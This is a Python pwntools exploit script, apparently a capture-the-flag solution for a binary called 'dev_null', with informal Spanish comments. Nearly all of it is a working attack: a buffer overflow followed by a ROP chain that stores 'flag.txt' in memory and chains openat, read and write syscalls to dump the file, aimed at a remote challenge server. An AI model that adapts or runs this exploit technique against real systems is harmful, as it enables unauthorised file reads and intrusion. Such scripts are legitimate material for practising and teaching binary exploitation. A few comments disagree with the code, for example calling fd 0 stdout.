from pwn import *

gs = '''
b *0x401900
b *dev_null+52
continue
'''

elf = context.binary = ELF("./dev_null")

def start():
    if args.REMOTE:
        return remote("98e9a87c-2bb0-4884-a039-b04098029ea8.x3c.tf", 31337, ssl=True)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']

io = start()

dev_null = 0x0000000000401e72

rop = ROP(elf)

pop_rsi = 0x0000000000402acc  # pop rsi ; pop rbp ; ret
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] # pop rdi ; ret
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0] # pop rax ; ret
ret = rop.find_gadget(['ret'])[0]
syscall = 0x41a339 # syscall Para: 0x000000000041a334 : mov eax, 0xc ; syscall
data = 0x00000000004ae0a0
filename_addr = data + 8
mov_qword_ptr_rsi = 0x0000000000420f45 # mov qword ptr [rsi], rax ; ret
xor_rax_rax = 0x0000000000452df0
pop_rbp = 0x000000000040114c
mov_edi = 0x0000000000401959 # mov edi, 0x4afa98
sub_rdi_rcx = 0x0000000000418ad3 # sub rdi, rcx ; add rax, rdi ; ret
mov_rdx_rdi = 0x0000000000417a80 # mov rdx, rdi ; rep stosb byte ptr [rdi], al ; mov rax, rdx ; ret
pop_rbx_r12_r13_rbp = 0x0000000000401147 # pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
mov_rdx_r12 = 0x000000000045cd95 # mov rdx, r12 ; push 0 ; call rbx
mov_rdx_rbx = 0x000000000041fcfb # mov rdx, rbx ; syscall
pop_r8 = 0x000000000042193b # pop r8 ; ret
add_rdx_r8 = 0x0000000000474961 # add rdx, r8 ; mov rax, rdx ; pop rbx ; ret

# ROP Chain

print(rop)

# b"flag.txt\x00".ljust(16, b"A"),
payload = b"".join([
    # Almacenar el filename 'flag.txt' en .data
    b"A"*16,
    p64(pop_rsi),
    p64(data),
    p64(0x0),
    p64(pop_rax),
    b"flag.txt",
    p64(mov_qword_ptr_rsi),
    p64(pop_rsi),
    p64(data + 8),
    p64(0x0),
    p64(xor_rax_rax),
    p64(mov_qword_ptr_rsi),
    p64(pop_rdi),
    p64(data), # Estara en rdi el address a data ojo el ropchain no termina aca ;-;
    # openat(rdi <= -100, rsi <= data, ... lo demas no interesa uwu)
    p64(pop_rsi),
    p64(data),   # mov rsi, @data   ; en @data esta el filename por eso jiji
    p64(0x0),    # mov rbp, 0x0
    p64(pop_rdi),
    p64(0x0),  # mov rdi, 0
    p64(pop_rdi),
    p64(-100 & 0xffffffffffffffff), # mov rdi, -100
    p64(pop_rax), 
    p64(257), # mov rax, 257
    p64(syscall), # syscall openat
    # read(rdi <= fd=3 (no es un socket en red asi que tranqui aca xd), rsi <= data, rdx <= 46)
    p64(pop_rdi),
    p64(3),
    p64(pop_r8),
    p64(46),
    p64(add_rdx_r8), # add rdx, r8
    p64(0x0), # pop rbx <= 0x0
    p64(pop_rax),
    p64(0x0),
    p64(syscall),
    # write (rdi <= fd=0 (stdout), rsi <= data, rdx <= 0x2e = 46)
    #p64(0x4141414141414141)
    p64(pop_rdi),
    p64(0x1), # stdout = 1
    p64(pop_rax),
    p64(0x1),
    p64(syscall)
])

io.recv()

io.sendline(payload)

io.interactive()